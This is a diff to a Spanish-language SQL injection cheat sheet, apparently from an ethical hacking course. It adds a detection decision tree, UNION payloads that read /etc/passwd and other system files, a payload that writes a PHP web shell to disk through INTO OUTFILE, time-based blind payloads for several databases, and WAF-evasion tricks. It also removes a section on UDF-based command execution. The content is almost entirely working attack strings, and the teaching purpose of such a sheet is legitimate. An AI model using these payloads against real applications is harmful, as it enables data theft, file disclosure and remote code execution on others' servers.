@@ -4,9 +4,27 @@
       Asignatura: Hacking Ético
 =====================================================
 
-=== PASO 1: DETECTAR VULNERABILIDAD ===
+=== PASO 1: DETECTAR Y CLASIFICAR VULNERABILIDAD ===
 
-Probar:
+--- Arbol de decision ---
+
+1. Prueba ' → ¿da error visible?
+   SI  → injectable, puede ser UNION-Based o Error-Based
+   NO  → puede ser Blind o no vulnerable, sigue al paso 2
+
+2. Prueba 1' AND 1=1-- -  y  1' AND 1=2-- -
+   Respuestas DIFERENTES → Boolean-Based Blind → ir a seccion BLIND
+   Misma respuesta        → probar Time-Based, sigue al paso 3
+
+3. Prueba 1' AND sleep(5)-- -
+   Tarda ~5 segundos → Time-Based Blind → ir a seccion TIME-BASED
+   No tarda           → probablemente no vulnerable
+
+4. Prueba 1' UNION SELECT NULL-- - (subiendo NULLs hasta que funcione)
+   Funciona → UNION-Based → seguir con PASO 2 de esta guia
+
+--- Payloads de deteccion ---
+
 '
 ' -- -
 ' OR '1'='1' -- -
@@ -48,6 +66,8 @@ Confirmar con UNION (usar NULL, no numeros - ver nota abajo):
 1' UNION SELECT version(),null-- -
 1' UNION SELECT @@version_compile_os,@@version_compile_machine-- -  (OS y arquitectura 32/64)
 1' UNION SELECT @@plugin_dir,null-- -                               (directorio de plugins MySQL)
+1' UNION SELECT @@secure_file_priv,null-- -                         (restriccion de escritura de ficheros)
+1' UNION SELECT @@datadir,null-- -                                  (directorio de datos de MySQL)
 
 
 === PASO 5: LISTAR BASES DE DATOS ===
@@ -94,12 +114,45 @@ Privilegio de escritura de ficheros:
 1' UNION SELECT file_priv,null FROM mysql.user WHERE user='root'-- -
 (Y = tiene privilegios, N = no tiene)
 
+Restriccion de directorio de escritura:
+1' UNION SELECT @@secure_file_priv,null-- -
+(vacio = sin restriccion, ruta = solo puede escribir ahi)
+
 Directorio de plugins:
 1' UNION SELECT @@plugin_dir,null-- -
 
 Version y arquitectura del servidor:
 1' UNION SELECT version(),null-- -
 1' UNION SELECT @@version_compile_os,@@version_compile_machine-- -
+
+
+=== PASO 10: LEER Y ESCRIBIR FICHEROS ===
+
+OUTFILE vs DUMPFILE - diferencia importante:
+  INTO OUTFILE  -> añade separadores y saltos de linea (para texto/CSV)
+  INTO DUMPFILE -> escribe byte a byte sin añadir nada (para binarios como .so)
+
+Leer ficheros del sistema:
+1' UNION SELECT LOAD_FILE('/etc/passwd'),null-- -
+1' UNION SELECT LOAD_FILE('/etc/crontab'),null-- -
+1' UNION SELECT LOAD_FILE('/opt/lampp/etc/httpd.conf'),null-- -
+
+Verificar si un fichero existe y tiene contenido:
+1' UNION SELECT LOAD_FILE('/ruta/fichero'),null-- -
+(null en surname = fichero no existe o sin permisos)
+(contenido en surname = fichero leido correctamente)
+
+Escribir webshell (texto plano - usar OUTFILE):
+1' UNION SELECT '<?php system($_GET["cmd"]); ?>',null INTO OUTFILE '/ruta/shell.php'-- -
+
+Escribir binario (.so, .dll - usar DUMPFILE):
+1' UNION SELECT LOAD_FILE('/origen/fichero'),null INTO DUMPFILE '/destino/fichero'-- -
+
+[!] ERRORES COMUNES al escribir:
+  Errcode 13 = Permission denied (MySQL no tiene permisos de SO en ese directorio)
+  Errcode 2  = No such file or directory (la ruta no existe)
+  Warning mysql_numrows() = La query fallo silenciosamente (puede ser exito en OUTFILE)
+  Verificar siempre con LOAD_FILE si el fichero se escribio correctamente
 
 
 =====================================================
@@ -124,6 +177,9 @@ Version y arquitectura del servidor:
 1' AND substring(database(),1,1)='a'-- -
 1' AND substring(database(),1,1)='b'-- -
 ...hasta TRUE, luego posicion 2, 3, etc.
+
+Bypass comillas con ASCII (si las comillas estan filtradas):
+1' AND ascii(substring(database(),1,1))=100-- -
 
 
 === PASO 4: CONTAR BASES DE DATOS ===
@@ -159,6 +215,26 @@ Extraer nombre:
 === PASO 8: REPETIR PARA COLUMNAS Y DATOS ===
 
 (mismo proceso con information_schema.columns y luego la tabla objetivo)
+
+
+=====================================================
+            TIME-BASED BLIND
+=====================================================
+
+Confirmar:
+1' AND sleep(5)-- -         (si tarda 5s = vulnerable)
+
+Condicional (mas eficiente, solo duerme si condicion TRUE):
+1' AND IF(substring(database(),1,1)='d', sleep(5), 0)-- -
+
+Si SLEEP esta filtrado:
+1' AND BENCHMARK(10000000,MD5('A'))-- -
+
+MSSQL:
+1'; WAITFOR DELAY '00:00:05'-- -
+
+PostgreSQL:
+1'; SELECT pg_sleep(5)-- -
 
 
 =====================================================
@@ -215,7 +291,7 @@ FLUJO COMPLETO SIN COMENTARIOS:
 4. Listar BDs:
 ?name=x'%09UNION%09SELECT%091,schema_name,3,4,'5'%09FROM%09information_schema.schemata%09WHERE%09'1'='1
 
-5. Listar tablas (la comilla de 'exercises la cierra la consulta):
+5. Listar tablas:
 ?name=x'%09UNION%09SELECT%091,table_name,3,4,'5'%09FROM%09information_schema.tables%09WHERE%09table_schema='exercises
 
 6. Listar columnas:
@@ -226,27 +302,26 @@ FLUJO COMPLETO SIN COMENTARIOS:
 
 
 =====================================================
-         ESCALADA A RCE VIA UDF (MySQL)
+              BYPASS WAF
 =====================================================
 
-Requisitos:
-- Usuario MySQL con privilegios root
-- file_priv = Y  (verificar con paso 9 arriba)
-- Conocer @@plugin_dir
-- Arquitectura del servidor (32/64 bits via @@version_compile_machine)
+Espacios:
+  /**/   %09   %0a   +
 
-Flujo:
-1. Verificar privilegios y arquitectura (ver PASO 9)
-2. Buscar libreria UDF maliciosa en Kali:
-   find / -name "lib_mysqludf_sys*" 2>/dev/null
-3. Seleccionar la correcta segun arquitectura (32/64 bits)
-4. Escribir la libreria .so en @@plugin_dir via INTO DUMPFILE
-5. Registrar la funcion: CREATE FUNCTION sys_exec RETURNS INT SONAME 'udf.so'
-6. Ejecutar comandos: SELECT sys_exec('id')
+Case mixing:
+  SeLeCt   UnIoN   wHeRe
 
-Tablas de mysql relevantes para UDF:
-- mysql.user     -> usuarios y privilegios
-- mysql.func     -> funciones UDF registradas
-- mysql.plugin   -> plugins cargados
+Inline comments:
+  UN/**/ION SE/**/LECT
 
+Hex en vez de strings:
+  0x61646d696e = 'admin'
+  WHERE user=0x61646d696e
+
+Codificacion URL doble:
+  %2527 = %27 = '
+
+
+=====================================================
+  [Ver fichero Escalada-RCE.txt para webshell, UDF y reverse shell]
 =====================================================
